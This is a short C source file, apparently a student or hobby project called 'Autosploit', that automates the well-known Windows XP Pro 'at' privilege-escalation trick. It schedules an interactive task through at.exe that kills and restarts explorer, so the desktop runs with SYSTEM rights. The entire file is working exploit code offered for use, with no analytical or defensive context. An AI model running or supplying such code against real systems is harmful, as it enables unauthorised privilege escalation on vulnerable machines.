/* PROJECT AUTOSPLOIT
 * File:   Main.c
 * Author: Original C version: Matthew Jack, with collaboration from Richard Childs
 * Updated by Sean Edwards, April 13, 2014, 7:23 PM
 * Updated to current version by Sean Edwards and Matthew Jack, May 18, 2014, 2:16 AM
 * 
 * Automated WinXPPro "at" privilege escalation exploit.
 * 
 * Created on October 8, 2012, 4:14 PM
 * Finished on October, 16, 2012, 7:56 PM
 */


#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <time.h>

	void process(char argv1[150])
	{
	STARTUPINFO			siStartupInfo;
	PROCESS_INFORMATION piProcessInfo;
	
	memset(&siStartupInfo, 0, sizeof(siStartupInfo));
	memset(&piProcessInfo, 0, sizeof(piProcessInfo));
	
	siStartupInfo.cb = sizeof(siStartupInfo);
	
	if(CreateProcess("C:\\Windows\\System32\\at.exe",
						argv1,
						0,
						0,
						FALSE,
						CREATE_NO_WINDOW,
						0,
						0,
						&siStartupInfo,
						&piProcessInfo) == FALSE)
						
	 {
	perror("Process failed to create!\n");
	 }
	}
	
int main(void) {

	time_t rawtime;
	struct tm *formtime;
	
	char cmd[150];

	time (&rawtime);
    rawtime += 60;
    formtime = localtime (&rawtime);
	char time[10];
	strftime(time, 10, "%H:%M", formtime);
	sprintf(cmd, " %s /interactive cmd /k \"taskkill /f /im explorer* && explorer.exe\"", time);
	process(cmd);
	return 0; 
}
